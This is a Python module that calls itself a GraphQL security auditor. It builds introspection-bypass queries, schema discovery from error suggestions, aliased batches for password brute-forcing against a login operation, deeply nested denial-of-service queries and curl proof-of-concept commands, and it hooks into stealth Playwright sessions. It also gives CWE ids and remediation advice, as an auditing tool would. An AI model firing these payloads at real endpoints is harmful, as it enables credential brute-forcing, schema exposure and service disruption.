"""
GraphQL Deep Logic & Protected Attribute Diagnostic Engine
Module: graphql_security_auditor.py

A modular, production-grade security auditing toolkit designed for Playwright
and Behavioral-Playwright async workflows. Includes schema introspection validation,
error suggestion parsing, protected attribute positional correlation auditing,
aliased operation batching evaluation, and query complexity calculation.
"""

import asyncio
import json
import logging
import re
import shlex
import time
import urllib.parse
from collections import deque
from typing import Dict, Any, List, Optional, Tuple, Union

logger = logging.getLogger("BehavioralEvasion.GraphQLAuditor")


class GraphQLIntrospectionAuditor:
    """
    Audits GraphQL endpoints for introspection availability and suggestion-based
    schema discovery (Clairvoyance technique).
    """

    UNIVERSAL_QUERY = 'query { __typename }'
    BASIC_INTROSPECTION = '{__schema{queryType{name}}}'
    FULL_INTROSPECTION = """
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          kind
          name
          description
          fields(includeDeprecated: true) {
            name
            description
            args {
              name
              type { kind name }
            }
          }
        }
      }
    }
    """

    @staticmethod
    def generate_introspection_bypasses() -> List[Dict[str, Any]]:
        """
        Generates 5 standard variation queries for endpoint schema verification.
        """
        return [
            {"technique": "Newline Injection", "query": "query {\n  __schema \n  {\n    queryType{name}\n  }\n}"},
            {"technique": "Comma/Space Padding", "query": "query{ , __schema , {queryType{name}}}"},
            {"technique": "Fragment Wrap Bypass", "query": "query Bypass { ...SchemaFrag } fragment SchemaFrag on Query { __schema { queryType { name } } }"},
            {"technique": "GET Method URL-Encoding", "method": "GET", "query_param": "query=%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D"},
            {"technique": "Form Urlencoded POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "query=query%7B__schema%7BqueryType%7Bname%7D%7D%7D"}
        ]

    @staticmethod
    def parse_clairvoyance_suggestions(error_message: str) -> List[str]:
        """
        Extracts suggested field and type names from GraphQL error responses
        (e.g., 'Cannot query field "user". Did you mean "userProfile", "userInfo"?').
        """
        suggestions = []
        val = str(error_message or "")
        matches = re.findall(r'Did you mean ([^?]+)\?', val, re.IGNORECASE)
        for match in matches:
            fields = re.findall(r'"([^"]+)"', match)
            suggestions.extend(fields)
        return list(dict.fromkeys(suggestions))


class GraphQLProtectedAttributeAuditor:
    """
    Audits Protected Attribute redaction layers for Positional Correlation
    and side-channel exposure.
    """

    @staticmethod
    def generate_positional_correlation_payloads(
        target_field: str = "title",
        sort_parameter: str = "TITLE_ASC"
    ) -> Dict[str, Any]:
        """
        Generates sorting queries to detect if database-level sorting occurs
        prior to field-level access control attribute redaction.
        """
        probe_query = f"""
        query AuditPositionalCorrelation {{
          reports(sort: {sort_parameter}) {{
            id
            {target_field}
            status
          }}
        }}
        """
        return {
            "vulnerability_type": "Protected Attribute Positional Correlation",
            "cwe_id": "CWE-200 (Exposure of Sensitive Information Through Data Correlation)",
            "sort_parameter_tested": sort_parameter,
            "target_field_tested": target_field,
            "probe_query": probe_query.strip(),
            "remediation": "Enforce access control filtering at the database level BEFORE running ORDER BY or sorting operations."
        }

    @staticmethod
    def analyze_redacted_positional_shift(
        response_items: List[Dict[str, Any]],
        target_object_id: str,
        redacted_field_name: str = "title"
    ) -> Dict[str, Any]:
        """
        Analyzes the index position of a redacted object relative to neighboring items
        to determine if its alphabetical or numerical rank leaks through sorting.
        Enforces a minimum collection size (> 1) to eliminate single-item false positives.
        """
        if not response_items or len(response_items) < 2:
            return {
                "target_id": target_object_id,
                "position_index": -1,
                "is_attribute_redacted": False,
                "positional_sidechannel_risk": "LOW",
                "details": "Insufficient items to establish relative positional correlation."
            }

        target_index = -1
        is_redacted = False

        for idx, item in enumerate(response_items):
            if str(item.get("id")) == str(target_object_id):
                target_index = idx
                val = item.get(redacted_field_name)
                is_redacted = (val is None or val == "" or val == "[REDACTED]" or str(val).startswith("[HIDDEN]"))
                break

        leak_detected = is_redacted and (target_index != -1)
        return {
            "target_id": target_object_id,
            "position_index": target_index,
            "total_items": len(response_items),
            "is_attribute_redacted": is_redacted,
            "positional_sidechannel_risk": "HIGH" if leak_detected else "LOW",
            "details": f"Redacted object '{target_object_id}' is sorted at relative position index {target_index} of {len(response_items)} items." if leak_detected else "No positional correlation detected."
        }


class GraphQLAliasedBatchingAuditor:
    """
    Constructs aliased queries to evaluate rate-limit and operation-count limits.
    """

    @staticmethod
    def generate_aliased_bruteforce_batch(
        operation_name: str,
        param_name: str,
        payload_list: List[Any],
        batch_size: int = 50
    ) -> str:
        """
        Bundles multiple operations under aliases into a single GraphQL query body.
        """
        bounded_payloads = payload_list[:batch_size]
        alias_blocks = []

        for idx, payload in enumerate(bounded_payloads):
            formatted_val = json.dumps(payload)
            alias_blocks.append(f'  alias_{idx}: {operation_name}({param_name}: {formatted_val}) {{ id success }}')

        query_body = "\n".join(alias_blocks)
        return f"query AliasedBatchVerification {{\n{query_body}\n}}"


class GraphQLQueryComplexityAuditor:
    """
    Evaluates query nesting depth to detect Denial of Service (DoS) and complexity risks.
    """

    @staticmethod
    def generate_nested_depth_query(depth: int = 15, relationship_field: str = "friends") -> str:
        """
        Generates deeply nested queries to test recursion and depth limits.
        """
        query = "id\n" + f"{relationship_field} {{\n" * depth + "  id\n" + "}" * depth
        return f"query QueryDepthDoS {{\n  user {{\n{query}\n  }}\n}}"

    @staticmethod
    def compute_query_depth(query_string: str) -> int:
        """
        Computes maximum nesting depth of braces in a GraphQL query.
        Cleans string literals and comments first to prevent false depth inflations.
        """
        raw = str(query_string or "")
        # Remove single-line comments (# ...)
        cleaned = re.sub(r'#[^\n]*', '', raw)
        # Remove quoted string literals ("...")
        cleaned = re.sub(r'"(?:[^"\\]|\\.)*"', '', cleaned)

        max_depth = 0
        current_depth = 0
        for char in cleaned:
            if char == '{':
                current_depth += 1
                if current_depth > max_depth:
                    max_depth = current_depth
            elif char == '}':
                current_depth = max(0, current_depth - 1)
        return max_depth


class GraphQLCSRFAuditor:
    """
    Audits GraphQL endpoints for Content-Type downgrade and Cross-Site Request Forgery risks.
    """

    @staticmethod
    def audit_content_type_csrf_risk(
        accepted_method: str,
        content_type: str,
        has_csrf_token: bool = False
    ) -> Dict[str, Any]:
        """
        Checks if the endpoint accepts GET or x-www-form-urlencoded POST
        without enforcing anti-CSRF token verification.
        """
        method_upper = str(accepted_method or "POST").upper()
        ct_lower = str(content_type or "").lower()

        is_get_csrf = (method_upper == "GET")
        is_form_csrf = (method_upper == "POST") and ("x-www-form-urlencoded" in ct_lower)
        is_vulnerable = (is_get_csrf or is_form_csrf) and not has_csrf_token

        return {
            "method": method_upper,
            "content_type": ct_lower,
            "csrf_vulnerable": is_vulnerable,
            "risk_level": "HIGH" if is_vulnerable else "LOW",
            "cwe_id": "CWE-352 (Cross-Site Request Forgery)",
            "recommendation": "Enforce strict JSON-encoded POST requests (application/json) with CSRF token validation."
        }


class GraphQLPoCEngine:
    """
    Synthesizes shell-safe, reproducible cURL commands for GraphQL requests.
    """

    @staticmethod
    def generate_graphql_curl_poc(
        graphql_url: str,
        query: str,
        variables: Optional[Dict[str, Any]] = None,
        headers: Optional[Dict[str, str]] = None,
        method: str = "POST"
    ) -> str:
        """
        Synthesizes a valid, shell-escaped cURL command for GraphQL POST/GET requests.
        """
        url = str(graphql_url or "https://target.com/graphql")
        method_upper = str(method or "POST").upper()
        hdrs = dict(headers or {})

        curl_cmd = ["curl", "-i", "-X", method_upper]

        if method_upper == "POST":
            curl_cmd.append(url)
            if not any(k.lower() == "content-type" for k in hdrs):
                hdrs["Content-Type"] = "application/json"

            payload = {"query": query}
            if variables:
                payload["variables"] = variables

            data_str = json.dumps(payload)
            for k, v in hdrs.items():
                if k.lower() not in ['host', 'content-length']:
                    curl_cmd.extend(["-H", f"{k}: {v}"])
            curl_cmd.extend(["--data-raw", data_str])
        else:
            encoded_query = urllib.parse.quote(query)
            separator = "&" if "?" in url else "?"
            target_get_url = f"{url}{separator}query={encoded_query}"
            curl_cmd.append(target_get_url)
            for k, v in hdrs.items():
                if k.lower() not in ['host', 'content-length']:
                    curl_cmd.extend(["-H", f"{k}: {v}"])

        return " ".join(shlex.quote(arg) for arg in curl_cmd)


class MasterGraphQLDeepLogicEngine:
    """
    Master Orchestrator Class combining Introspection, Protected Attribute,
    Aliased Batching, Query Complexity, and CSRF diagnostic auditors.
    """

    def __init__(self, target_url: str = "https://target.com/graphql", max_findings: int = 500):
        self.target_url = target_url
        self.introspection_auditor = GraphQLIntrospectionAuditor()
        self.protected_attr_auditor = GraphQLProtectedAttributeAuditor()
        self.batch_auditor = GraphQLAliasedBatchingAuditor()
        self.depth_auditor = GraphQLQueryComplexityAuditor()
        self.csrf_auditor = GraphQLCSRFAuditor()
        self.poc_engine = GraphQLPoCEngine()

        self.captured_graphql_requests: deque = deque(maxlen=max_findings)
        self.findings: List[Dict[str, Any]] = []

    async def attach_to_playwright(self, bp_session=None, page=None) -> bool:
        """
        Attaches a dynamic network route handler to stealth Playwright / behavioral-playwright sessions.
        """
        active_page = page or getattr(bp_session, "page", None) or (bp_session if hasattr(bp_session, "route") else None)
        if not active_page:
            return False

        async def handle_route(route, request=None):
            try:
                req = request or (route.request if hasattr(route, "request") else route)
                url = getattr(req, "url", "")
                method = getattr(req, "method", "POST")
                post_data = getattr(req, "post_data", "") or ""

                if "graphql" in url.lower() or "query" in post_data or "__schema" in post_data:
                    self.captured_graphql_requests.append({
                        "url": url,
                        "method": method,
                        "post_data": post_data,
                        "timestamp": time.time()
                    })

                    headers = getattr(req, "headers", {})
                    ct = headers.get("content-type", "")
                    csrf_res = self.csrf_auditor.audit_content_type_csrf_risk(method, ct)
                    if csrf_res["csrf_vulnerable"]:
                        self.findings.append({
                            "type": "GRAPHQL_CSRF_RISK",
                            "url": url,
                            "details": csrf_res
                        })
            finally:
                try:
                    await route.continue_()
                except Exception:
                    pass

        try:
            await active_page.route("**/*", handle_route)
            return True
        except Exception:
            return False

    async def run_full_graphql_audit(self) -> Dict[str, Any]:
        """
        Executes a diagnostic scan across GraphQL modules.
        """
        bypasses = self.introspection_auditor.generate_introspection_bypasses()
        gem_payload = self.protected_attr_auditor.generate_positional_correlation_payloads()
        batch_sample = self.batch_auditor.generate_aliased_bruteforce_batch("login", "password", ["sample1", "sample2"])
        dos_query = self.depth_auditor.generate_nested_depth_query(depth=8)

        return {
            "timestamp": time.time(),
            "target_url": self.target_url,
            "captured_graphql_requests": len(self.captured_graphql_requests),
            "findings_count": len(self.findings),
            "findings": self.findings,
            "modules_status": {
                "introspection_bypasses_available": len(bypasses),
                "protected_attribute_spec": gem_payload["vulnerability_type"],
                "batching_engine": "READY",
                "complexity_engine": "READY"
            },
            "status": "GRAPHQL_DIAGNOSTIC_AUDIT_READY"
        }
